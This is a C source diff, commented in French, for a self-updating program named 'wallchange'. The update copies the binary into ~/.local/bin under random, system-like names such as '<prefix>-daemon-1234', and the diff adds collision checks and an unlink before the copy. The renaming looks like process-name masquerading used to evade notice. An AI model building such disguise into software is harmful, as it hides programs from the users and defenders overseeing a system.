@@ -137,12 +137,32 @@ void perform_update() {
     const char *suffixes[] = {"helper", "daemon", "service", "worker", "monitor", "agent", "manager", "handler", "launcher", "watcher", "server", "client", "bridge", "proxy", "wrapper"};
     
     srand(getpid() ^ time(NULL));
-    int prefix_idx = rand() % 20;
-    int suffix_idx = rand() % 15;
-    int random_num = rand() % 10000;
     
-    snprintf(new_process_name, sizeof(new_process_name), "%s-%s-%04d", 
-             prefixes[prefix_idx], suffixes[suffix_idx], random_num);
+    int tries = 0;
+    do {
+        int prefix_idx = rand() % 20;
+        int suffix_idx = rand() % 15;
+        int random_num = rand() % 10000;
+        
+        snprintf(new_process_name, sizeof(new_process_name), "%s-%s-%04d", 
+                 prefixes[prefix_idx], suffixes[suffix_idx], random_num);
+                 
+        // Vérifier si le nom est identique à l'actuel
+        if (strlen(process_name) > 0 && strcmp(process_name, new_process_name) == 0) {
+            continue;
+        }
+        
+        // Vérifier si le fichier existe déjà
+        char check_path[1024];
+        snprintf(check_path, sizeof(check_path), "%s/.local/bin/%s", home, new_process_name);
+        struct stat st_check;
+        if (stat(check_path, &st_check) != 0) {
+            // Le fichier n'existe pas, c'est bon
+            break;
+        }
+        
+        tries++;
+    } while (tries < 100);
     
     printf("Nouveau nom de processus: %s\n", new_process_name);
     
@@ -164,6 +184,10 @@ void perform_update() {
     // en train de l'exécuter. On le supprimera après avoir copié le nouveau.
     
     printf("Installation du nouveau binaire: %s\n", new_binary_path);
+
+    // Supprimer le fichier destination s'il existe (résout ETXTBSY si collisions ou fichier corrompu)
+    unlink(new_binary_path);
+
     char cp_cmd[CMD_MAX];
     snprintf(cp_cmd, sizeof(cp_cmd), "cp '%s/wallchange' '%s' && chmod +x '%s'", 
              temp_dir, new_binary_path, new_binary_path);
